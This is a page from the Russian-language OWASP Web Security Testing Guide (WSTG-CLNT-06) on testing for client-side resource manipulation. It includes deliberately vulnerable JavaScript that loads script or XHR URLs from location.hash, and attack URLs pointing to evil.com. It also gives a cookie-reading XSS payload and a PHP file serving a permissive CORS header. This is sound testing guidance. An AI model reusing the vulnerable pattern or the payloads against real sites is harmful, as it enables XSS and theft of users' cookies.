---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование манипулирования ресурсами на стороне клиента

|ID          |
|------------|
|WSTG-CLNT-06|

## Обзор

Уязвимость, связанная с манипулированием ресурсами на стороне клиента, представляет собой недостаток контроля ввода. Это происходит, когда приложение принимает входные данные, контролируемые пользователем, которые указывают путь к ресурсу, такому как источник iframe, JavaScript, апплет или обработчик XMLHttpRequest (XHR). Эта уязвимость заключается в возможности контролировать URL, которые ссылаются на некоторые ресурсы, присутствующие на web-странице. Влияние этой уязвимости может быть разным, обычно она используется для проведения XSS-атак. Эта уязвимость позволяет вмешиваться в ожидаемое поведение приложения, заставляя его загружать и отображать вредоносные объекты.

В следующем коде JavaScript показан потенциально уязвимый скрипт, в котором злоумышленник может контролировать `location.hash` (источник), который связан с атрибутом `src` элемента скрипта. Данный пример приводит к XSS-атаке, поскольку допускает инъекцию внешнего JavaScript.

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

Злоумышленник может нацелиться на жертву, заставив ее посетить URL:

`www.victim.com/#http://evil.com/js.js`

Где `js.js` содержит:

```js
alert(document.cookie)
```

Это приведет к появлению предупреждения в браузере жертвы.

Более разрушительный сценарий включает в себя возможность управления URL, вызываемым в запросе CORS. Поскольку CORS позволяет запрашивающему домену получать доступ к целевому ресурсу с помощью подхода, основанного на HTTP-заголовках, злоумышленник может попросить целевую страницу загрузить вредоносный контент со своего собственного сайта.

Вот пример уязвимой страницы:

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

Ввод `location.hash` контролирует пользователь и использует его для запроса внешнего ресурса, который затем будет отражён через конструкцию `innerHTML`. Злоумышленник может попросить жертву перейти по следующему URL:

`www.victim.com/#http://evil.com/html.html`

где полезная нагрузка обрабатывается в `html.html`:

```html
<?php
header('Access-Control-Allow-Origin: http://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## Задачи тестирования

- Найти приёмники с недостаточной проверкой входных данных.
- Оценить влияние манипуляций с ресурсами.

## Как тестировать

Чтобы вручную проверить наличие уязвимостей такого типа, мы должны выяснить, использует ли приложение входные данные без их адекватного контроля. Если это так, то эти входные данные находятся под контролем пользователя и могут использоваться для указания внешних ресурсов. Поскольку приложение может включать множество ресурсов (например, изображения, видео, объекты, css и iframe), следует изучить на предмет потенциальных проблем клиентские скрипты, обрабатывающие связанные URL.

В следующей таблице показаны возможные точки инъекции (приёмники), которые необходимо проверить:

| Тип ресурса   | Тег/метод                                | Приёмник   |
| --------------- | ----------------------------------------- | ------ |
| Фрейм           | iframe                                    | src    |
| Ссылка            | a                                         | href   |
| Запрос AJAX    | `xhr.open(method, [url], true);` | URL    |
| CSS             | link                                      | href   |
| Изображение           | img                                       | src    |
| Объект          | object                                    | data   |
| Скрипт          | script                                    | src    |

Наиболее интересными из них являются те, которые позволяют злоумышленнику включать код на стороне клиента (например, JavaScript), который может привести к уязвимостям XSS.
